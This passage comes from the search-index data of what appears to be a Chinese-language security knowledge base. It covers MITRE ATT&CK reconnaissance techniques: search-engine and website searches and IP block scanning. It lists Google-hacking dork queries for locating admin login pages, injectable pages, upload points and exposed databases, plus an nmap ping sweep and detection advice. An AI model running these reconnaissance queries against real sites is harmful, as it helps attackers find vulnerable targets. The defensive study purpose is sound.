<p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-001-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E7%A4%BE%E4%BA%A4%E5%AA%92%E4%BD%93/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1593-001</p> <p>https://attack.mitre.org/techniques/T1593/001/</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/","title":"T1593-002-\u641c\u7d22\u5f00\u653e\u7684\u57df/\u7f51\u7ad9-\u641c\u7d22\u5f15\u64ce","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u641c\u7d22\u5f15\u64ce\u6765\u6536\u96c6\u53d7\u5bb3\u8005\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u53ef\u4ee5\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u3002\u641c\u7d22\u5f15\u64ce\u670d\u52a1\u901a\u5e38\u4f1a\u6293\u53d6\u5728\u7ebf\u7f51\u7ad9\u7684\u7d22\u5f15\u5185\u5bb9\uff0c\u5e76\u53ef\u80fd\u4e3a\u7528\u6237\u63d0\u4f9b\u4e13\u95e8\u7684\u8bed\u6cd5\u6765\u641c\u7d22\u7279\u5b9a\u7684\u5173\u952e\u8bcd\u6216\u7279\u5b9a\u7c7b\u578b\u7684\u5185\u5bb9\uff08\u5373\u6587\u4ef6\u7c7b\u578b\uff09 \u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6839\u636e\u4ed6\u4eec\u60f3\u8981\u6536\u96c6\u7684\u4fe1\u606f\uff0c\u7cbe\u5fc3\u8bbe\u8ba1\u5404\u79cd\u641c\u7d22\u5f15\u64ce\u67e5\u8be2\u3002\u5a01\u80c1\u8005\u53ef\u80fd\u4f7f\u7528\u641c\u7d22\u5f15\u64ce\u6765\u6536\u96c6\u5173\u4e8e\u53d7\u5bb3\u8005\u7684\u4e00\u822c\u4fe1\u606f\uff0c\u4ee5\u53ca\u4f7f\u7528\u4e13\u95e8\u7684\u67e5\u8be2\u6765\u5bfb\u627e\u654f\u611f\u4fe1\u606f\u7684\u6cc4\u6f0f/\u6cc4\u9732\uff0c\u5982\u7f51\u7edc\u7ec6\u8282\u6216\u8bc1\u4e66\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4e3a\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u5f0f\u6280\u672f\u6570\u636e\u5e93\uff09\u3001\u5efa\u7acb\u4e1a\u52a1\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u8d26\u6237\u6216\u7834\u574f\u8d26\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u6709\u6548\u8d26\u6237\u6216\u9493\u9c7c\uff09\u63d0\u4f9b\u673a\u4f1a\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>google hacking</p> <p>\u57fa\u7840\u7bc7\uff1a</p> <pre><code>* intitle\uff1a\u641c\u7d22\u7f51\u9875\u6807\u9898\u4e2d\u5305\u542b\u6709\u7279\u5b9a\u5b57\u7b26\u7684\u7f51\u9875\u3002\u4f8b\u5982intitle: \u540e\u53f0\uff0c\u8fd9\u6837\u7f51\u9875\u6807\u9898\u4e2d\u5e26\u6709\u2018\u540e\u53f0\u2019\u7684\u7f51\u9875\u90fd\u4f1a\u88ab\u641c\u7d22\u51fa\u6765\u3002\n* inurl\uff1a\u641c\u7d22\u5305\u542b\u6709\u7279\u5b9a\u5b57\u7b26\u7684URL\u3002\u4f8b\u5982inurl:admin\uff0c\u53ef\u4ee5\u7528\u6765\u67e5\u627e\u7f51\u7ad9\u540e\u53f0\u3002\n* intext: \u641c\u7d22\u7f51\u9875\u6b63\u6587\u5185\u5bb9\u4e2d\u7684\u6307\u5b9a\u5b57\u7b26\uff0c\u4f8b\u5982intext:\u64cd\u4f5c\u7cfb\u7edf\u3002\u53ef\u4ee5\u641c\u7d22\u542b\u6709\u2018\u64cd\u4f5c\u7cfb\u7edf\u2019\u7684\u9875\u9762\n* Filetype: \u641c\u7d22\u6307\u5b9a\u7c7b\u578b\u7684\u6587\u4ef6\u3002\u4f8b\u5982\u64cd\u4f5c\u7cfb\u7edf\u3000filetype:pdf\uff0c\u5c31\u53ef\u4ee5\u627e\u5230\u5173\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u7684pdf\u6587\u6863\u3002\n* Site\uff1a\u627e\u5230\u4e0e\u6307\u5b9a\u7f51\u7ad9\u6709\u8054\u7cfb\u7684URL\u3002\u4f8b\u5982Site\uff1abaidu.com\u3002\u6240\u6709\u548c\u8fd9\u4e2a\u7f51\u7ad9\u6709\u8054\u7cfb\u7684URL\u90fd\u4f1a\u88ab\u663e\u793a\u3002\n* movie: \u5f53\u6211\u4eec\u7528movie\u63d0\u4ea4\u67e5\u8be2\u7684\u65f6\u5019\uff0cGoogle\u4f1a\u8fd4\u56de\u8ddf\u67e5\u8be2\u5173\u952e\u8bcd\u76f8\u5173\u7684\u7535\u5f71\u4fe1\u606f\u3002(\u5f53\u524d\u53ea\u652f\u6301\u82f1\u6587Google)\n* info: \u67e5\u8be2\u7f51\u7ad9\u7684\u4e00\u4e9b\u4fe1\u606f\u3002\u4f8b\u5982info:bbs.byr.cn\uff0c\u5b83\u53ea\u4f1a\u8fd4\u56de\u4e00\u4e2a\u7ed3\u679c\uff0c\u662f\u4e00\u4e2a\u9009\u62e9\u5217\u8868\uff0c\u5217\u8868\u7684\u9009\u9879\u662f\u8fd9\u4e2a\u7f51\u7ad9\u7684\u67d0\u4e00\u65b9\u9762\u7684\u4fe1\u606f\u3002info=cache+related+link+site+intext+intitle\u3002\n* \u53cc\u5f15\u53f7: \u4ee3\u8868\u5b8c\u5168\u5339\u914d\uff0c\u4f7f\u5173\u952e\u8bcd\u4e0d\u5206\u5f00\uff0c\u987a\u5e8f\u90fd\u4e0d\u80fd\u53d8\u3002\n* \u51cf\u53f7: \u51cf\u53f7\u4e0e\u524d\u4e00\u4e2a\u5173\u952e\u8bcd\u4e4b\u95f4\u4e00\u5b9a\u8981\u6709\u4e00\u4e2a\u7a7a\u683c\uff0c\u4e0e\u540e\u4e00\u4e2a\u5173\u952e\u8bcd\u4e4b\u95f4\u4e00\u5b9a\u4e0d\u80fd\u6709\u7a7a\u683c\u3002\u641c\u7d22\u7ed3\u679c\u4e3a\uff0c\u5339\u914d\u524d\u4e00\u4e2a\u5173\u952e\u8bcd\u4f46\u4e0d\u5339\u914d\u540e\u4e00\u4e2a\u5173\u952e\u8bcd\u7684\u7ed3\u679c\u3002\u4f8b\u5982seo -\u641c\u7d22\u5f15\u64ce\u3002\n* AND: \u903b\u8f91\u4e0e\uff0c\u8fd9\u4e2a\u547d\u4ee4\u6211\u4eec\u5176\u5b9e\u4e00\u76f4\u90fd\u5728\u7528\uff0c\u53ea\u662f\u6ca1\u6709\u610f\u8bc6\u5230\u3002\u4e00\u822c\u7528\u7a7a\u683c\u4ee3\u66ff\uff0c\u8fd8\u53ef\u4ee5\u7528\u201c+\u201d\u4ee3\u66ff\u3002\u4f8b\u5982\u9739\u96f3\u5e03\u888b+\u8d25\u4ea1\u4e4b\u5251\uff0c\u8fd4\u56de\u7684\u7ed3\u679c\u540c\u65f6\u5305\u542b\u4e24\u8005\u3002\n* weather: \u67e5\u8be2\u67d0\u4e00\u5730\u533a\u6216\u57ce\u5e02\u7684\u5929\u6c14\u3002\u4e0d\u8fc7\u6211\u4eec\u8fd9\u4e00\u5730\u533a\u6216\u57ce\u5e02\u5fc5\u987b\u662fGoogle\u80fd\u8bc6\u522b\u7684\uff0c\u4f8bweather:beijing\uff0cGoogle\u5c06\u4f1a\u7ed9\u6211\u4eec\u8fd4\u56de\u5317\u4eac\u7684\u5929\u6c14\u3002\n* \u661f\u53f7\uff08*\uff09: \u901a\u914d\u7b26\uff0c\u53ef\u4ee5\u5339\u914d\u4efb\u610f\u5b57\u7b26\u4e32\u3002\u4f8b\u5982\u641c\u7d22*\u64ce\uff0c\u5219\u8fd4\u56de\u7684\u7ed3\u679c\u4e2d\u4e0d\u4ec5\u6709\u201c\u641c\u7d22\u5f15\u64ce\u201d\uff0c\u8fd8\u6709\u201c\u641c\u7d22\u5de8\u64ce\u201d\u4e4b\u7c7b\u7684\u3002\n* allinurl: \u7ed3\u679c\u7684url\u4e2d\u5305\u542b\u591a\u4e2a\u5173\u952e\u8bcd\u3002\u4f8b\u5982allinurl:byr jobs\uff0c\u7b49\u4e8einurl:byr inurl:jobs\u3002allinurl\u4e5f\u662f\u6392\u4ed6\u6027\u6307\u4ee4\n* define: \u67e5\u8be2\u5173\u952e\u8bcd\u7684\u8bcd\u4e49\uff0c\u8d77\u7684\u662f\u5b57\u5178\u7684\u4f5c\u7528\u3002Google\u4f1a\u8fd4\u56de\u5305\u542b\u67e5\u8be2\u5173\u952e\u8bcd\u5b9a\u4e49\u7684\u7f51\u9875\uff0c\u4f8bdefine:computer\uff0c\u652f\u6301\u6c49\u5b57\u54e6\uff01\n</code></pre> <p>\u8fdb\u9636\u7bc7\uff1a</p> <pre><code>* \u67e5\u627e\u540e\u53f0\u5730\u5740\uff1asite:\u57df\u540d\ninurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms\n* \u67e5\u627e\u6587\u672c\u5185\u5bb9\uff1asite:\u57df\u540d intext:\u7ba1\u7406|\u540e\u53f0|\u767b\u9646|\u7528\u6237\u540d|\u5bc6\u7801|\u9a8c\u8bc1\u7801|\u7cfb\u7edf|\u5e10\u53f7|admin|login|sys|managetem|password|username\n* \u67e5\u627e\u53ef\u6ce8\u5165\u70b9\uff1asite:\u57df\u540d inurl:aspx|jsp|php|asp\n* \u67e5\u627e\u4e0a\u4f20\u6f0f\u6d1e\uff1asite:\u57df\u540d inurl:file|load|editor|Files\n* \u67e5\u770b\u811a\u672c\u7c7b\u578b\uff1asite:\u57df\u540d filetype:asp/aspx/php/jsp\n* \u8fc2\u56de\u7b56\u7565\uff1ainurl:cms/data/templates/images/index/\n* \u7f51\u7edc\u8bbe\u5907\u5173\u952e\u8bcd\uff1aintext:WEB Management Interface for H3C SecPath Series\n* \u5b58\u5728\u7684\u6570\u636e\u5e93\uff1asite:\u57df\u540d filetype:mdb|asp|#\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1593-002-%E6%90%9C%E7%B4%A2%E5%BC%80%E6%94%BE%E7%9A%84%E5%9F%9F_%E7%BD%91%E7%AB%99-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1593-002</p> <p>https://attack.mitre.org/techniques/T1593/002/</p> <p>Github Hacking | Google Hacking- \u4fe1\u606f\u641c\u96c6\u7bc7 - \u6e17\u900f\u7ea2\u961f\u7b14\u8bb0</p> <p>https://cloud.tencent.com/developer/article/1752139</p> <p>Google Hacking\u603b\u7ed3</p> <p>https://www.jianshu.com/p/f8062e2cc1d7</p> <p>\u4fe1\u606f\u6536\u96c6\u4e4bGoogle Hacking\u7684\u7b80\u5355\u7528\u6cd5</p> <p>https://blog.csdn.net/qq_36119192/article/details/84029809</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/","title":"T1594-\u641c\u7d22\u53d7\u5bb3\u8005\u6240\u62e5\u6709\u7684\u7f51\u7ad9","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff0c\u4ee5\u83b7\u53d6\u53ef\u5728\u76ee\u6807\u653b\u51fb\u4e2d\u4f7f\u7528\u7684\u4fe1\u606f\u3002\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\u53ef\u80fd\u5305\u542b\u5404\u79cd\u7ec6\u8282\uff0c\u5305\u62ec\u90e8\u95e8/\u5206\u90e8\u7684\u540d\u79f0\u3001\u7269\u7406\u4f4d\u7f6e\u548c\u5173\u952e\u5458\u5de5\u7684\u6570\u636e\uff0c\u5982\u59d3\u540d\u3001\u89d2\u8272\u548c\u8054\u7cfb\u4fe1\u606f\uff08\u4f8b\u5982\uff1a\u7535\u5b50\u90ae\u4ef6\u5730\u5740\uff09\u3002\u8fd9\u4e9b\u7f51\u7ad9\u8fd8\u53ef\u80fd\u6709\u7a81\u51fa\u5546\u4e1a\u8fd0\u4f5c\u548c\u5173\u7cfb\u7684\u7ec6\u8282\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u641c\u7d22\u53d7\u5bb3\u8005\u62e5\u6709\u7684\u7f51\u7ad9\uff0c\u4ee5\u6536\u96c6\u53ef\u64cd\u4f5c\u7684\u4fe1\u606f\u3002\u6765\u81ea\u8fd9\u4e9b\u6765\u6e90\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u63d0\u4f9b\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u673a\u4f1a\uff08\u4f8b\u5982\uff1a\u9493\u9c7c\u4fe1\u606f\u6216\u641c\u7d22\u5f00\u653e\u5f0f\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u5efa\u7acb\u4e1a\u52a1\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5efa\u7acb\u8d26\u6237\u6216\u7834\u574f\u8d26\u6237\uff09\u6216\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u4fe1\u4efb\u5173\u7cfb\u6216\u9493\u9c7c\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u4e2a\u4eba\u7406\u89e3\uff1a\u6536\u96c6\u7f51\u7ad9\u4e0a\u516c\u5e03\u7684\u4eba\u4e8b\u4fe1\u606f\uff08\u653f\u5e9c\u7f51\u7ad9\u5c45\u591a\uff09\u3001\u7ba1\u7406\u5458\u90ae\u7bb1\u4fe1\u606f\u7b49\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u65e0</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#_6","title":"\u5efa\u8bae","text":"<p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1594-%E6%90%9C%E7%B4%A2%E5%8F%97%E5%AE%B3%E8%80%85%E6%89%80%E6%8B%A5%E6%9C%89%E7%9A%84%E7%BD%91%E7%AB%99/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1594</p> <p>https://attack.mitre.org/techniques/T1594</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/","title":"T1595-001-\u4e3b\u52a8\u626b\u63cf_\u626b\u63cf\u5730\u5740\u6bb5","text":""},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u5b9e\u65bd\u653b\u51fb\u524d\u626b\u63cfIP\u5730\u5740\u5757\uff0c\u6536\u96c6\u53ef\u5728\u786e\u5b9a\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u7684\u4fe1\u606f\u3002\u516c\u6709IP\u5730\u5740\u53ef\u4ee5\u6309\u5757\u6216\u662f\u6309\u4e00\u7cfb\u5217\u987a\u5e8f\u5730\u5740\u5206\u914d\u7ed9\u7ec4\u7ec7\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u626b\u63cfIP\u5730\u5740\u5757\uff0c\u4ee5\u4fbf\u6536\u96c6\u53d7\u5bb3\u8005\u7f51\u7edc\u4fe1\u606f\uff0c\u4f8b\u5982\u54ea\u4e9bIP\u5730\u5740\u5206\u914d\u7ed9\u4e86\u54ea\u4e9b\u4e3b\u673a\u4f7f\u7528\u4ee5\u53ca\u8fd9\u4e9b\u4e3b\u673a\u7684\u8be6\u7ec6\u4fe1\u606f\u3002\u626b\u63cf\u8303\u56f4\u53ef\u4ee5\u4ece\u7b80\u5355\u7684ping\uff08ICMP\u8bf7\u6c42\u548c\u54cd\u5e94\uff09\u5230\u66f4\u7ec6\u81f4\u7684\u626b\u63cf\uff08\u901a\u8fc7\u670d\u52a1\u5668banner\u6216\u5176\u4ed6\u7f51\u7edcartifacts\u663e\u793a\u4e3b\u673a\u8f6f\u4ef6/\u7248\u672c\uff09\u3002\u626b\u63cf\u6240\u83b7\u53d6\u7684\u4fe1\u606f\u53ef\u80fd\u4f1a\u89e6\u53d1\u5176\u4ed6\u5f62\u5f0f\u7684\u4fa6\u5bdf\u884c\u52a8\uff08\u4f8b\u5982\uff1a\u641c\u7d22\u5f00\u653e\u7f51\u7ad9/\u57df\u6216\u641c\u7d22\u516c\u5f00\u6280\u672f\u6570\u636e\u5e93\uff09\uff0c\u4ece\u800c\u5efa\u7acb\u8fd0\u8425\u8d44\u6e90\uff08\u4f8b\u5982\uff1a\u5f00\u53d1\u80fd\u529b\u6216\u83b7\u53d6\u80fd\u529b\uff09\uff0c\u6216\u5b9e\u73b0\u521d\u59cb\u8bbf\u95ee\uff08\u4f8b\u5982\uff1a\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1\uff09\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u5e38\u89c1\u626b\u63cf\u5668</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>HTTP\u6d41\u91cf</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>nmap\u626b\u63cf\u7f51\u6bb5\u5185\u7684\u6240\u6709IP\u5730\u5740</p> <pre><code>sudo nmap -sP -PI -PT 192.168.1.0/24\n</code></pre>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0\u5b9e\u6d4b\uff0c\u6545\u65e0\u7559\u75d5</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":"<p>\u5b9e\u9645\u4e0a\uff0c\u5f88\u96be\u5728\u771f\u5b9e\u7684\u73af\u5883\u4e2d\u53d1\u73b0\u6b64\u7c7b\u884c\u4e3a\u3002\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u90e8\u7f72\u871c\u7f50\u6765\u8fdb\u884c\u76d1\u6d4b\u9632\u5fa1\uff0c\u5f53\u53d1\u73b0\u6709\u653b\u51fb\u8005\u8bbf\u95ee\u4e86\u540c\u4e00\u7f51\u6bb5\u4e0d\u540c\u5730\u5740\u7684\u871c\u7f50\uff0c\u4ea7\u751f\u544a\u8b66\u884c\u4e3a\uff0c\u5219\u8bf4\u660e\u53ef\u80fd\u5b58\u5728\u626b\u63cf\u884c\u4e3a\u3002\u503c\u5f97\u5f15\u8d77\u5b89\u5168\u4eba\u5458\u7684\u6ce8\u610f\uff01</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#_6","title":"\u5efa\u8bae","text":"<p>\u76d1\u63a7\u53ef\u80fd\u5b58\u5728\u626b\u63cf\u7684\u53ef\u7591\u7f51\u7edc\u6d41\u91cf\uff0c\u4f8b\u5982\u6765\u81ea\u5355\u4e2a\u6e90\u7684\u5927\u91cf\u6d41\u91cf\uff08\u5c24\u5176\u662f\u5982\u679c\u5df2\u77e5\u8be5\u6e90\u4e0e\u653b\u51fb\u8005\u6216\u50f5\u5c38\u7f51\u7edc\u76f8\u5173\u8054\uff09\u3002\u5206\u6790Web\u8bbf\u95ee\u6570\u636e\u4e5f\u53ef\u80fd\u4f1a\u53d1\u73b0\u6f5c\u5728\u6076\u610f\u6d3b\u52a8\u7684\u7279\u5f81\uff0c\u4f8b\u5982referer\u503c\u6216HTTP/S\u4e2d\u7684user-agent\u5b57\u6bb5\u91cc\u5b57\u7b26\u4e32\u3002</p> <p>\u8bb8\u591a\u6b64\u7c7b\u653b\u51fb\u6d3b\u52a8\u7684\u53d1\u751f\u7387\u5f88\u9ad8\uff0c\u5e76\u4e14\u76f8\u5173\u7684\u8bef\u62a5\u7387\u4e5f\u5f88\u9ad8\uff0c\u5e76\u4e14\u6709\u53ef\u80fd\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u76d1\u6d4b\u8303\u56f4\u4e4b\u5916\uff0c\u4ece\u800c\u4f7f\u9632\u5fa1\u8005\u96be\u4ee5\u53d1\u73b0\u3002</p> <p>\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u4f1a\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u76f8\u5173\u9636\u6bb5\uff0c\u4f8b\u5982\u5728\"\u521d\u59cb\u8bbf\u95ee\"\u9636\u6bb5\u3002</p>"},{"location":"0x1_%E4%BE%A6%E5%AF%9F/T1595-001-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F-IP%E5%9C%B0%E5%9D%80/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1595-001</p> <p>https://attack.mitre.org/techniques/T1595/001/</p> 